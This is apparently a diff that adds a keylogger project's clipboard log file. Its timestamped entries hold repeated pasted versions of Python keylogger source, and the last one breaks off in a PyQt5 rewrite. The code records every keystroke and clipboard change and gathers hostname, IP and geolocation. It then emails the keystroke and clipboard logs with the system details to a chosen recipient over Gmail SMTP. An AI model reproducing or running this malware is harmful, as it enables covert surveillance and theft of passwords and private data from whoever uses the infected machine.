+        root.option_add('*label1.font', 'Helvetica 12 bold')
+        root.option_add('*scrolledtext.foreground', 'black')
+        root.option_add('*Menu.foreground', 'black')
+        root.option_add('*Menu.font', 'Helvetica 12')
+        root.option_add('*TButton.font', 'Helvetica 12 bold')
+        root.option_add('*label.foreground', 'black')
+        root.option_add('*label1.foreground', 'black')
+        root.option_add('*scrolledtext.background', 'white')
+        root.option_add('*scrolledtext.foreground', 'black')
+        root.option_add('*scrolledtext*foreground', 'black')
+        root.option_add('*Label*foreground', 'black')
+        root.option_add('*Label*background', 'white')
+        root.option_add('*Label*highlightThickness', 0)
+        root.option_add('*Label*highlightBackground', 'white')
+
+        root.option_add('*frame1*background', 'white')
+
+        root.option_add('*scrolledtext.background', 'white')
+        root.option_add('*scrolledtext.foreground', 'black')
+
+        root.option_add('*scrolledtext*highlightBackground', 'white')
+        root.option_add('*scrolledtext*highlightThickness', 0)
+        root.option_add('*scrolledtext*highlightColor', 'white')
+
+
+# Main window
+root = tk.Tk()
+root.title("Keylogger GUI")
+
+# Create labels
+keylog_label = tk.Label(root, text="Keylogger", font=("Arial", 12, 'bold'))
+keylog_label.grid(row=0, column=0, padx=10, pady=10)
+
+clipboard_label = tk.Label(root, text="Clipboard Log", font=("Arial", 12, 'bold'))
+clipboard_label.grid(row=1, column=0, padx=10, pady=10)
+
+computer_info_label = tk.Label(root, text="Computer Information", font=("Arial", 12, 'bold'))
+computer_info_label.grid(row=0, column=1, padx=10, pady=10)
+
+geo_location_label = tk.Label(root, text="Geo-Location Information", font=("Arial", 12, 'bold'))
+geo_location_label.grid(row=1, column=1, padx=10, pady=10)
+
+# Create scrolled text areas
+keylog_text = scrolledtext.ScrolledText(root, width=40, height=5)
+keylog_text.grid(row=0, column=0, padx=10, pady=10)
+
+clipboard_text = scrolledtext.ScrolledText(root, width=40, height=5)
+clipboard_text.grid(row=1, column=0, padx=10, pady=10)
+
+computer_info_text = scrolledtext.ScrolledText(root, width=40, height=5)
+computer_info_text.grid(row=0, column=1, padx=10, pady=10)
+
+geo_location_text = scrolledtext.ScrolledText(root, width=40, height=5)
+geo_location_text.grid(row=1, column=1, padx=10, pady=10)
+
+# Create buttons
+keylogger_button = tk.Button(root, text="Start Keylogger", command=toggle_keylogger)
+keylogger_button.grid(row=2, column=0, padx=10, pady=10)
+
+send_button = tk.Button(root, text="Send Log via Email", command=send_log)
+send_button.grid(row=2, column=1, padx=10, pady=10)
+
+settings_button = tk.Button(root, text="Settings", command=toggle_mode)
+settings_button.grid(row=3, column=0, padx=10, pady=10)
+
+root.mainloop()
+
+[2024-12-16 00:04:54.911016] ysttlvswdketqork
+[2024-12-16 00:33:51.538126] ysttlvswdketqork
+[2024-12-16 00:34:07.424429] ysttlvswdketqork
+[2024-12-16 00:34:10.139420] ysttlvswdketqork
+[2024-12-16 00:34:10.886990] ysttlvswdketqork
+[2024-12-16 00:37:01.527456] from gooey import Gooey, GooeyParser
+from pynput.keyboard import Key, Listener
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+import datetime
+import socket
+import platform
+import os
+import requests
+import pyperclip
+import time
+import threading
+
+# Initialize variables
+keys = []
+
+# Function to track clipboard activity
+def track_clipboard():
+    try:
+        previous_clipboard = ""
+        if not os.path.exists("clipboard_log.txt"):
+            open("clipboard_log.txt", "w").close()
+
+        while True:
+            clipboard_content = pyperclip.paste()
+            if clipboard_content != previous_clipboard:
+                print(f"New clipboard content: {clipboard_content}")
+                with open("clipboard_log.txt", "a") as log_file:
+                    log_file.write(f"[{datetime.datetime.now()}] {clipboard_content}\n")
+                previous_clipboard = clipboard_content
+            time.sleep(2)
+    except Exception as e:
+        print(f"Error tracking clipboard: {e}")
+
+# Function to get computer information
+def get_computer_info():
+    try:
+        hostname = socket.gethostname()
+        ip_address = socket.gethostbyname(hostname)
+        system = platform.system()
+        release = platform.release()
+        version = platform.version()
+        machine = platform.machine()
+        processor = platform.processor()
+
+        computer_info = (
+            f"Hostname: {hostname}\n"
+            f"IP Address: {ip_address}\n"
+            f"Operating System: {system} {release}\n"
+            f"OS Version: {version}\n"
+            f"Machine: {machine}\n"
+            f"Processor: {processor}\n"
+        )
+        return computer_info
+    except Exception as e:
+        return f"Could not retrieve computer info: {e}"
+
+# Function to get geolocation details
+def get_geo_location():
+    try:
+        response = requests.get("https://ipinfo.io/json")
+        if response.status_code == 200:
+            data = response.json()
+
+            location = (
+                f"IP Address: {data.get('ip')}\n"
+                f"City: {data.get('city')}\n"
+                f"Region: {data.get('region')}\n"
+                f"Country: {data.get('country')}\n"
+                f"Location (Lat, Long): {data.get('loc')}\n"
+                f"Organization: {data.get('org')}\n"
+            )
+            return location
+        else:
+            return "Failed to get geo-location data."
+    except Exception as e:
+        return f"Error retrieving geo-location: {e}"
+
+# Function to send the log via email
+def send_log(sender_email, sender_password, recipient_email, log_data):
+    now = datetime.datetime.now()
+    subject = f"Keylogger Report - {now.strftime('%Y-%m-%d %H:%M:%S')}"
+
+    msg = MIMEMultipart()
+    msg['From'] = sender_email
+    msg['To'] = recipient_email
+    msg['Subject'] = subject
+
+    computer_info = get_computer_info()
+    geo_location_info = get_geo_location()
+
+    body = f"""
+    <html>
+    <body>
+    <h2>Keylogger Report</h2>
+    <h3>Computer Information</h3>
+    <pre>{computer_info}</pre>
+    <h3>Geo-Location Details</h3>
+    <pre>{geo_location_info}</pre>
+    <h3>Log Data:</h3>
+    <p>Please find the keylogs and the clipboard log in the attached log files.</p>
+    </body>
+    </html>
+    """
+    msg.attach(MIMEText(body, "html"))
+
+    # Save and attach the log file
+    log_file_path = "log.txt"
+    with open(log_file_path, "w") as log_file:
+        log_file.write(log_data)
+
+    with open(log_file_path, "rb") as attachment:
+        part = MIMEBase("application", "octet-stream")
+        part.set_payload(attachment.read())
+        encoders.encode_base64(part)
+        part.add_header("Content-Disposition", f"attachment; filename=log.txt")
+        msg.attach(part)
+
+    # Attach clipboard log
+    clipboard_log_path = "clipboard_log.txt"
+    if os.path.exists(clipboard_log_path):
+        with open(clipboard_log_path, "r") as clipboard_file:
+            clipboard_data = clipboard_file.read()
+        clipboard_attachment = MIMEText(clipboard_data, 'plain')
+        clipboard_attachment.add_header('Content-Disposition', 'attachment', filename="clipboard_log.txt")
+        msg.attach(clipboard_attachment)
+
+    try:
+        with smtplib.SMTP('smtp.gmail.com', 587) as server:
+            server.starttls()
+            server.login(sender_email, sender_password)
+            server.send_message(msg)
+        print("Log data sent successfully!")
+        os.remove(log_file_path)
+    except Exception as e:
+        print(f"Failed to send email: {e}")
+
+# Function to handle key press events
+def on_press(key):
+    global keys
+    keys.append(key)
+    print(f"{key} pressed")
+
+# Function to format keys
+def format_keys(keys):
+    log_parts = []
+    for key in keys:
+        k = str(key).replace("'", "")
+        if "space" in k:
+            log_parts.append(' ')
+        elif "enter" in k:
+            log_parts.append('[ENTER]')
+        elif "backspace" in k:
+            if log_parts:
+                log_parts.pop()
+        elif "Key" in k:
+            log_parts.append(f"[{k.upper()}]")
+        else:
+            log_parts.append(k)
+    return ''.join(log_parts)
+
+# Function to handle key release events
+def on_release(key):
+    global keys
+    if key == Key.esc:
+        if keys:
+            log_data = format_keys(keys)
+            send_log(sender_email, sender_password, recipient_email, log_data)
+        return False
+
+# Gooey GUI Setup
+@Gooey(program_name="Keylogger App", default_size=(600, 400))
+def main():
+    parser = GooeyParser()
+    parser.add_argument('--mode', choices=['Light', 'Dark'], default='Light', widget='Dropdown', help="Select the interface mode")
+    parser.add_argument('--sender_email', help="Sender's Email", widget="TextField")
+    parser.add_argument('--sender_password', help="Sender's Email Password", widget="PasswordField")
+    parser.add_argument('--recipient_email', help="Recipient's Email", widget="TextField")
+
+    args = parser.parse_args()
+
+    global sender_email, sender_password, recipient_email
+    sender_email = args.sender_email
+    sender_password = args.sender_password
+    recipient_email = args.recipient_email
+
+    # Start clipboard tracking in a separate thread
+    clipboard_thread = threading.Thread(target=track_clipboard, daemon=True)
+    clipboard_thread.start()
+
+    # Start the keyboard listener
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+if __name__ == "__main__":
+    main()
+
+[2024-12-16 16:08:55.091566] from gooey import Gooey, GooeyParser
+from pynput.keyboard import Key, Listener
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+import datetime
+import socket
+import platform
+import os
+import requests
+import pyperclip
+import time
+import threading
+import tkinter as tk
+from tkinter import ttk
+
+# Initialize variables
+keys = []
+sender_email = ""
+sender_password = ""
+recipient_email = ""
+
+# Function to track clipboard activity
+def track_clipboard():
+    try:
+        previous_clipboard = ""
+        if not os.path.exists("clipboard_log.txt"):
+            open("clipboard_log.txt", "w").close()
+
+        while True:
+            clipboard_content = pyperclip.paste()
+            if clipboard_content != previous_clipboard:
+                with open("clipboard_log.txt", "a") as log_file:
+                    log_file.write(f"[{datetime.datetime.now()}] {clipboard_content}\n")
+                previous_clipboard = clipboard_content
+            time.sleep(2)
+    except Exception as e:
+        print(f"Error tracking clipboard: {e}")
+
+# Function to get computer information
+def get_computer_info():
+    try:
+        hostname = socket.gethostname()
+        ip_address = socket.gethostbyname(hostname)
+        system = platform.system()
+        release = platform.release()
+        version = platform.version()
+        machine = platform.machine()
+        processor = platform.processor()
+
+        computer_info = (
+            f"Hostname: {hostname}\n"
+            f"IP Address: {ip_address}\n"
+            f"Operating System: {system} {release}\n"
+            f"OS Version: {version}\n"
+            f"Machine: {machine}\n"
+            f"Processor: {processor}\n"
+        )
+        return computer_info
+    except Exception as e:
+        return f"Could not retrieve computer info: {e}"
+
+# Function to get geolocation details
+def get_geo_location():
+    try:
+        response = requests.get("https://ipinfo.io/json")
+        if response.status_code == 200:
+            data = response.json()
+
+            location = (
+                f"IP Address: {data.get('ip')}\n"
+                f"City: {data.get('city')}\n"
+                f"Region: {data.get('region')}\n"
+                f"Country: {data.get('country')}\n"
+                f"Location (Lat, Long): {data.get('loc')}\n"
+                f"Organization: {data.get('org')}\n"
+            )
+            return location
+        else:
+            return "Failed to get geo-location data."
+    except Exception as e:
+        return f"Error retrieving geo-location: {e}"
+
+# Function to format keys
+def format_keys(keys):
+    log_parts = []
+    for key in keys:
+        k = str(key).replace("'", "")
+        if "space" in k:
+            log_parts.append(' ')
+        elif "enter" in k:
+            log_parts.append('[ENTER]')
+        elif "backspace" in k:
+            if log_parts:
+                log_parts.pop()
+        elif "Key" in k:
+            log_parts.append(f"[{k.upper()}]")
+        else:
+            log_parts.append(k)
+    return ''.join(log_parts)
+
+# Function to display the master dashboard
+def display_dashboard():
+    from gooey import Gooey
+
+    # Gooey for the dashboard
+    @Gooey(program_name="Dashboard", default_size=(800, 600))
+    def dashboard_view():
+        parser = GooeyParser()
+        parser.add_argument('--computer_info', help="Displays computer information", widget='Textarea', default=get_computer_info())
+        parser.add_argument('--geo_location', help="Displays geo-location data", widget='Textarea', default=get_geo_location())
+        parser.add_argument('--key_log', help="Displays key logs", widget='Textarea', default=format_keys(keys))
+        try:
+            with open("clipboard_log.txt", "r") as clipboard_log:
+                clipboard_data = clipboard_log.read()
+        except FileNotFoundError:
+            clipboard_data = "No clipboard log available."
+        parser.add_argument('--clipboard_log', help="Displays clipboard logs", widget='Textarea', default=clipboard_data)
+
+        args = parser.parse_args()
+
+    dashboard_view()
+
+# Gooey GUI Setup
+@Gooey(program_name="Keylogger App", default_size=(600, 400))
+def main():
+    parser = GooeyParser()
+
+    # Settings window
+    parser.add_argument('--mode', choices=['Light', 'Dark'], default='Light', widget='Dropdown', help="Select the interface mode")
+    parser.add_argument('--sender_email', help="Sender's Email", widget="TextField")
+    parser.add_argument('--sender_password', help="Sender's Email Password", widget="PasswordField")
+    parser.add_argument('--recipient_email', help="Recipient's Email", widget="TextField")
+
+    args = parser.parse_args()
+
+    global sender_email, sender_password, recipient_email
+    sender_email = args.sender_email
+    sender_password = args.sender_password
+    recipient_email = args.recipient_email
+
+    # Start clipboard tracking in a separate thread
+    clipboard_thread = threading.Thread(target=track_clipboard, daemon=True)
+    clipboard_thread.start()
+
+    # Launch the dashboard after settings
+    display_dashboard()
+
+if __name__ == "__main__":
+    main()
+
+[2024-12-16 16:09:08.567115] from gooey import Gooey, GooeyParser
+from pynput.keyboard import Key, Listener
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+import datetime
+import socket
+import platform
+import os
+import requests
+import pyperclip
+import time
+import threading
+import tkinter as tk
+from tkinter import ttk
+
+# Initialize variables
+keys = []
+sender_email = ""
+sender_password = ""
+recipient_email = ""
+
+# Function to track clipboard activity
+def track_clipboard():
+    try:
+        previous_clipboard = ""
+        if not os.path.exists("clipboard_log.txt"):
+            open("clipboard_log.txt", "w").close()
+
+        while True:
+            clipboard_content = pyperclip.paste()
+            if clipboard_content != previous_clipboard:
+                with open("clipboard_log.txt", "a") as log_file:
+                    log_file.write(f"[{datetime.datetime.now()}] {clipboard_content}\n")
+                previous_clipboard = clipboard_content
+            time.sleep(2)
+    except Exception as e:
+        print(f"Error tracking clipboard: {e}")
+
+# Function to get computer information
+def get_computer_info():
+    try:
+        hostname = socket.gethostname()
+        ip_address = socket.gethostbyname(hostname)
+        system = platform.system()
+        release = platform.release()
+        version = platform.version()
+        machine = platform.machine()
+        processor = platform.processor()
+
+        computer_info = (
+            f"Hostname: {hostname}\n"
+            f"IP Address: {ip_address}\n"
+            f"Operating System: {system} {release}\n"
+            f"OS Version: {version}\n"
+            f"Machine: {machine}\n"
+            f"Processor: {processor}\n"
+        )
+        return computer_info
+    except Exception as e:
+        return f"Could not retrieve computer info: {e}"
+
+# Function to get geolocation details
+def get_geo_location():
+    try:
+        response = requests.get("https://ipinfo.io/json")
+        if response.status_code == 200:
+            data = response.json()
+
+            location = (
+                f"IP Address: {data.get('ip')}\n"
+                f"City: {data.get('city')}\n"
+                f"Region: {data.get('region')}\n"
+                f"Country: {data.get('country')}\n"
+                f"Location (Lat, Long): {data.get('loc')}\n"
+                f"Organization: {data.get('org')}\n"
+            )
+            return location
+        else:
+            return "Failed to get geo-location data."
+    except Exception as e:
+        return f"Error retrieving geo-location: {e}"
+
+# Function to format keys
+def format_keys(keys):
+    log_parts = []
+    for key in keys:
+        k = str(key).replace("'", "")
+        if "space" in k:
+            log_parts.append(' ')
+        elif "enter" in k:
+            log_parts.append('[ENTER]')
+        elif "backspace" in k:
+            if log_parts:
+                log_parts.pop()
+        elif "Key" in k:
+            log_parts.append(f"[{k.upper()}]")
+        else:
+            log_parts.append(k)
+    return ''.join(log_parts)
+
+# Function to display the master dashboard
+def display_dashboard():
+    from gooey import Gooey
+
+    # Gooey for the dashboard
+    @Gooey(program_name="Dashboard", default_size=(800, 600))
+    def dashboard_view():
+        parser = GooeyParser()
+        parser.add_argument('--computer_info', help="Displays computer information", widget='Textarea', default=get_computer_info())
+        parser.add_argument('--geo_location', help="Displays geo-location data", widget='Textarea', default=get_geo_location())
+        parser.add_argument('--key_log', help="Displays key logs", widget='Textarea', default=format_keys(keys))
+        try:
+            with open("clipboard_log.txt", "r") as clipboard_log:
+                clipboard_data = clipboard_log.read()
+        except FileNotFoundError:
+            clipboard_data = "No clipboard log available."
+        parser.add_argument('--clipboard_log', help="Displays clipboard logs", widget='Textarea', default=clipboard_data)
+
+        args = parser.parse_args()
+
+    dashboard_view()
+
+# Gooey GUI Setup
+@Gooey(program_name="Keylogger App", default_size=(600, 400))
+def main():
+    parser = GooeyParser()
+
+    # Settings window
+    parser.add_argument('--mode', choices=['Light', 'Dark'], default='Light', widget='Dropdown', help="Select the interface mode")
+    parser.add_argument('--sender_email', help="Sender's Email", widget="TextField")
+    parser.add_argument('--sender_password', help="Sender's Email Password", widget="PasswordField")
+    parser.add_argument('--recipient_email', help="Recipient's Email", widget="TextField")
+
+    args = parser.parse_args()
+
+    global sender_email, sender_password, recipient_email
+    sender_email = args.sender_email
+    sender_password = args.sender_password
+    recipient_email = args.recipient_email
+
+    # Start clipboard tracking in a separate thread
+    clipboard_thread = threading.Thread(target=track_clipboard, daemon=True)
+    clipboard_thread.start()
+
+    # Launch the dashboard after settings
+    display_dashboard()
+
+if __name__ == "__main__":
+    main()
+
+[2024-12-16 16:24:29.131571] from gooey import Gooey, GooeyParser
+from pynput.keyboard import Key, Listener
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+import datetime
+import socket
+import platform
+import os
+import requests
+import pyperclip
+import time
+import threading
+import tkinter as tk
+from tkinter import ttk
+
+# Initialize variables
+keys = []
+sender_email = ""
+sender_password = ""
+recipient_email = ""
+
+# Function to track clipboard activity
+def track_clipboard():
+    try:
+        previous_clipboard = ""
+        if not os.path.exists("clipboard_log.txt"):
+            open("clipboard_log.txt", "w").close()
+
+        while True:
+            clipboard_content = pyperclip.paste()
+            if clipboard_content != previous_clipboard:
+                with open("clipboard_log.txt", "a") as log_file:
+                    log_file.write(f"[{datetime.datetime.now()}] {clipboard_content}\n")
+                previous_clipboard = clipboard_content
+            time.sleep(2)
+    except Exception as e:
+        print(f"Error tracking clipboard: {e}")
+
+# Function to get computer information
+def get_computer_info():
+    try:
+        hostname = socket.gethostname()
+        ip_address = socket.gethostbyname(hostname)
+        system = platform.system()
+        release = platform.release()
+        version = platform.version()
+        machine = platform.machine()
+        processor = platform.processor()
+
+        computer_info = (
+            f"Hostname: {hostname}\n"
+            f"IP Address: {ip_address}\n"
+            f"Operating System: {system} {release}\n"
+            f"OS Version: {version}\n"
+            f"Machine: {machine}\n"
+            f"Processor: {processor}\n"
+        )
+        return computer_info
+    except Exception as e:
+        return f"Could not retrieve computer info: {e}"
+
+# Function to get geolocation details
+def get_geo_location():
+    try:
+        response = requests.get("https://ipinfo.io/json")
+        if response.status_code == 200:
+            data = response.json()
+
+            location = (
+                f"IP Address: {data.get('ip')}\n"
+                f"City: {data.get('city')}\n"
+                f"Region: {data.get('region')}\n"
+                f"Country: {data.get('country')}\n"
+                f"Location (Lat, Long): {data.get('loc')}\n"
+                f"Organization: {data.get('org')}\n"
+            )
+            return location
+        else:
+            return "Failed to get geo-location data."
+    except Exception as e:
+        return f"Error retrieving geo-location: {e}"
+
+# Function to format keys
+def format_keys(keys):
+    log_parts = []
+    for key in keys:
+        k = str(key).replace("'", "")
+        if "space" in k:
+            log_parts.append(' ')
+        elif "enter" in k:
+            log_parts.append('[ENTER]')
+        elif "backspace" in k:
+            if log_parts:
+                log_parts.pop()
+        elif "Key" in k:
+            log_parts.append(f"[{k.upper()}]")
+        else:
+            log_parts.append(k)
+    return ''.join(log_parts)
+
+# Function to display the master dashboard
+def display_dashboard():
+    from gooey import Gooey
+
+    # Gooey for the dashboard
+    @Gooey(program_name="Dashboard", default_size=(800, 600))
+    def dashboard_view():
+        parser = GooeyParser()
+        parser.add_argument('--computer_info', help="Displays computer information", widget='Textarea', default=get_computer_info())
+        parser.add_argument('--geo_location', help="Displays geo-location data", widget='Textarea', default=get_geo_location())
+        parser.add_argument('--key_log', help="Displays key logs", widget='Textarea', default=format_keys(keys))
+        try:
+            with open("clipboard_log.txt", "r") as clipboard_log:
+                clipboard_data = clipboard_log.read()
+        except FileNotFoundError:
+            clipboard_data = "No clipboard log available."
+        parser.add_argument('--clipboard_log', help="Displays clipboard logs", widget='Textarea', default=clipboard_data)
+
+        args = parser.parse_args()
+
+    dashboard_view()
+
+# Gooey GUI Setup
+@Gooey(program_name="Keylogger App", default_size=(600, 400))
+def main():
+    parser = GooeyParser()
+
+    # Settings window
+    parser.add_argument('--mode', choices=['Light', 'Dark'], default='Light', widget='Dropdown', help="Select the interface mode")
+    parser.add_argument('--sender_email', help="Sender's Email", widget="TextField")
+    parser.add_argument('--sender_password', help="Sender's Email Password", widget="PasswordField")
+    parser.add_argument('--recipient_email', help="Recipient's Email", widget="TextField")
+
+    args = parser.parse_args()
+
+    global sender_email, sender_password, recipient_email
+    sender_email = args.sender_email
+    sender_password = args.sender_password
+    recipient_email = args.recipient_email
+
+    # Start clipboard tracking in a separate thread
+    clipboard_thread = threading.Thread(target=track_clipboard, daemon=True)
+    clipboard_thread.start()
+
+    # Launch the dashboard after settings
+    display_dashboard()
+
+if __name__ == "__main__":
+    main()
+
+[2024-12-16 16:25:09.781540] from gooey import Gooey, GooeyParser
+from pynput.keyboard import Key, Listener
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+import datetime
+import socket
+import platform
+import os
+import requests
+import pyperclip
+import time
+import threading
+import tkinter as tk
+from tkinter import ttk
+
+# Initialize variables
+keys = []
+sender_email = ""
+sender_password = ""
+recipient_email = ""
+
+# Function to track clipboard activity
+def track_clipboard():
+    try:
+        previous_clipboard = ""
+        if not os.path.exists("clipboard_log.txt"):
+            open("clipboard_log.txt", "w").close()
+
+        while True:
+            clipboard_content = pyperclip.paste()
+            if clipboard_content != previous_clipboard:
+                with open("clipboard_log.txt", "a") as log_file:
+                    log_file.write(f"[{datetime.datetime.now()}] {clipboard_content}\n")
+                previous_clipboard = clipboard_content
+            time.sleep(2)
+    except Exception as e:
+        print(f"Error tracking clipboard: {e}")
+
+# Function to get computer information
+def get_computer_info():
+    try:
+        hostname = socket.gethostname()
+        ip_address = socket.gethostbyname(hostname)
+        system = platform.system()
+        release = platform.release()
+        version = platform.version()
+        machine = platform.machine()
+        processor = platform.processor()
+
+        computer_info = (
+            f"Hostname: {hostname}\n"
+            f"IP Address: {ip_address}\n"
+            f"Operating System: {system} {release}\n"
+            f"OS Version: {version}\n"
+            f"Machine: {machine}\n"
+            f"Processor: {processor}\n"
+        )
+        return computer_info
+    except Exception as e:
+        return f"Could not retrieve computer info: {e}"
+
+# Function to get geolocation details
+def get_geo_location():
+    try:
+        response = requests.get("https://ipinfo.io/json")
+        if response.status_code == 200:
+            data = response.json()
+
+            location = (
+                f"IP Address: {data.get('ip')}\n"
+                f"City: {data.get('city')}\n"
+                f"Region: {data.get('region')}\n"
+                f"Country: {data.get('country')}\n"
+                f"Location (Lat, Long): {data.get('loc')}\n"
+                f"Organization: {data.get('org')}\n"
+            )
+            return location
+        else:
+            return "Failed to get geo-location data."
+    except Exception as e:
+        return f"Error retrieving geo-location: {e}"
+
+# Function to format keys
+def format_keys(keys):
+    log_parts = []
+    for key in keys:
+        k = str(key).replace("'", "")
+        if "space" in k:
+            log_parts.append(' ')
+        elif "enter" in k:
+            log_parts.append('[ENTER]')
+        elif "backspace" in k:
+            if log_parts:
+                log_parts.pop()
+        elif "Key" in k:
+            log_parts.append(f"[{k.upper()}]")
+        else:
+            log_parts.append(k)
+    return ''.join(log_parts)
+
+# Function to display the master dashboard
+def display_dashboard():
+    from gooey import Gooey
+
+    # Gooey for the dashboard
+    @Gooey(program_name="Dashboard", default_size=(800, 600))
+    def dashboard_view():
+        parser = GooeyParser()
+        parser.add_argument('--computer_info', help="Displays computer information", widget='Textarea', default=get_computer_info())
+        parser.add_argument('--geo_location', help="Displays geo-location data", widget='Textarea', default=get_geo_location())
+        parser.add_argument('--key_log', help="Displays key logs", widget='Textarea', default=format_keys(keys))
+        try:
+            with open("clipboard_log.txt", "r") as clipboard_log:
+                clipboard_data = clipboard_log.read()
+        except FileNotFoundError:
+            clipboard_data = "No clipboard log available."
+        parser.add_argument('--clipboard_log', help="Displays clipboard logs", widget='Textarea', default=clipboard_data)
+
+        args = parser.parse_args()
+
+    dashboard_view()
+
+# Gooey GUI Setup
+@Gooey(program_name="Keylogger App", default_size=(600, 400))
+def main():
+    parser = GooeyParser()
+
+    # Settings window
+    parser.add_argument('--mode', choices=['Light', 'Dark'], default='Light', widget='Dropdown', help="Select the interface mode")
+    parser.add_argument('--sender_email', help="Sender's Email", widget="TextField")
+    parser.add_argument('--sender_password', help="Sender's Email Password", widget="PasswordField")
+    parser.add_argument('--recipient_email', help="Recipient's Email", widget="TextField")
+
+    args = parser.parse_args()
+
+    global sender_email, sender_password, recipient_email
+    sender_email = args.sender_email
+    sender_password = args.sender_password
+    recipient_email = args.recipient_email
+
+    # Start clipboard tracking in a separate thread
+    clipboard_thread = threading.Thread(target=track_clipboard, daemon=True)
+    clipboard_thread.start()
+
+    # Launch the dashboard after settings
+    display_dashboard()
+
+if __name__ == "__main__":
+    main()
+
+[2024-12-16 16:25:25.785652] 
+[2024-12-16 16:31:59.975381] from gooey import Gooey, GooeyParser
+from pynput.keyboard import Key, Listener
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+import datetime
+import socket
+import platform
+import os
+import requests
+import pyperclip
+import time
+import threading
+import tkinter as tk
+from tkinter import ttk
+
+# Initialize variables
+keys = []
+sender_email = ""
+sender_password = ""
+recipient_email = ""
+
+# Function to track clipboard activity
+def track_clipboard():
+    try:
+        previous_clipboard = ""
+        if not os.path.exists("clipboard_log.txt"):
+            open("clipboard_log.txt", "w").close()
+
+        while True:
+            clipboard_content = pyperclip.paste()
+            if clipboard_content != previous_clipboard:
+                with open("clipboard_log.txt", "a") as log_file:
+                    log_file.write(f"[{datetime.datetime.now()}] {clipboard_content}\n")
+                previous_clipboard = clipboard_content
+            time.sleep(2)
+    except Exception as e:
+        print(f"Error tracking clipboard: {e}")
+
+# Function to get computer information
+def get_computer_info():
+    try:
+        hostname = socket.gethostname()
+        ip_address = socket.gethostbyname(hostname)
+        system = platform.system()
+        release = platform.release()
+        version = platform.version()
+        machine = platform.machine()
+        processor = platform.processor()
+
+        computer_info = (
+            f"Hostname: {hostname}\n"
+            f"IP Address: {ip_address}\n"
+            f"Operating System: {system} {release}\n"
+            f"OS Version: {version}\n"
+            f"Machine: {machine}\n"
+            f"Processor: {processor}\n"
+        )
+        return computer_info
+    except Exception as e:
+        return f"Could not retrieve computer info: {e}"
+
+# Function to get geolocation details
+def get_geo_location():
+    try:
+        response = requests.get("https://ipinfo.io/json")
+        if response.status_code == 200:
+            data = response.json()
+
+            location = (
+                f"IP Address: {data.get('ip')}\n"
+                f"City: {data.get('city')}\n"
+                f"Region: {data.get('region')}\n"
+                f"Country: {data.get('country')}\n"
+                f"Location (Lat, Long): {data.get('loc')}\n"
+                f"Organization: {data.get('org')}\n"
+            )
+            return location
+        else:
+            return "Failed to get geo-location data."
+    except Exception as e:
+        return f"Error retrieving geo-location: {e}"
+
+# Function to format keys
+def format_keys(keys):
+    log_parts = []
+    for key in keys:
+        k = str(key).replace("'", "")
+        if "space" in k:
+            log_parts.append(' ')
+        elif "enter" in k:
+            log_parts.append('[ENTER]')
+        elif "backspace" in k:
+            if log_parts:
+                log_parts.pop()
+        elif "Key" in k:
+            log_parts.append(f"[{k.upper()}]")
+        else:
+            log_parts.append(k)
+    return ''.join(log_parts)
+
+# Function to display the master dashboard
+def display_dashboard():
+    from gooey import Gooey
+
+    # Gooey for the dashboard
+    @Gooey(program_name="Dashboard", default_size=(800, 600))
+    def dashboard_view():
+        parser = GooeyParser()
+        parser.add_argument('--computer_info', help="Displays computer information", widget='Textarea', default=get_computer_info())
+        parser.add_argument('--geo_location', help="Displays geo-location data", widget='Textarea', default=get_geo_location())
+        parser.add_argument('--key_log', help="Displays key logs", widget='Textarea', default=format_keys(keys))
+        try:
+            with open("clipboard_log.txt", "r") as clipboard_log:
+                clipboard_data = clipboard_log.read()
+        except FileNotFoundError:
+            clipboard_data = "No clipboard log available."
+        parser.add_argument('--clipboard_log', help="Displays clipboard logs", widget='Textarea', default=clipboard_data)
+
+        args = parser.parse_args()
+
+    dashboard_view()
+
+# Gooey GUI Setup
+@Gooey(program_name="Keylogger App", default_size=(600, 400))
+def main():
+    parser = GooeyParser()
+
+    # Settings window
+    parser.add_argument('--mode', choices=['Light', 'Dark'], default='Light', widget='Dropdown', help="Select the interface mode")
+    parser.add_argument('--sender_email', help="Sender's Email", widget="TextField")
+    parser.add_argument('--sender_password', help="Sender's Email Password", widget="PasswordField")
+    parser.add_argument('--recipient_email', help="Recipient's Email", widget="TextField")
+
+    args = parser.parse_args()
+
+    global sender_email, sender_password, recipient_email
+    sender_email = args.sender_email
+    sender_password = args.sender_password
+    recipient_email = args.recipient_email
+
+    # Start clipboard tracking in a separate thread
+    clipboard_thread = threading.Thread(target=track_clipboard, daemon=True)
+    clipboard_thread.start()
+
+    # Launch the dashboard after settings
+    display_dashboard()
+
+if __name__ == "__main__":
+    main()
+
+[2025-01-22 18:50:10.000903] NameError: name 'kself' is not defined. Did you mean: 'self'?
+
+[2025-01-22 18:54:54.714835] import sys
+import os
+import time
+import datetime
+import socket
+import platform
+import requests
+import pyperclip
+import threading
+from pynput.keyboard import Key, Listener
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+from PyQt5.QtWidgets import QApplication, QMainWindow, QTextEdit, QPushButton, QAction
+from PyQt5.QtCore import Qt, pyqtSignal, QThread
+from PyQt5 import uic
+
+# Initialize variables for the keylogger
+keys = []
+
+# Define the Keylogger class (as a background thread)
+class Keylogger(QThread):
+    log_signal = pyqtSignal(str)  # Signal to send logs to the GUI
+
+    def __init__(self):
+        super().__init__()
+        self.running = True
+
+    def run(self):
+        # Start clipboard tracking in a separate thread
+        clipboard_thread = threading.Thread(target=self.track_clipboard, daemon=True)
+        clipboard_thread.start()
+
+        # Start the keyboard listener
+        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
+            listener.join()
+
+    def on_press(self, key):
+        global keys
+        keys.append(key)
+        print(f"{key} pressed")
+
+    def on_release(self, key):
+        global keys
+        if key == Key.esc:
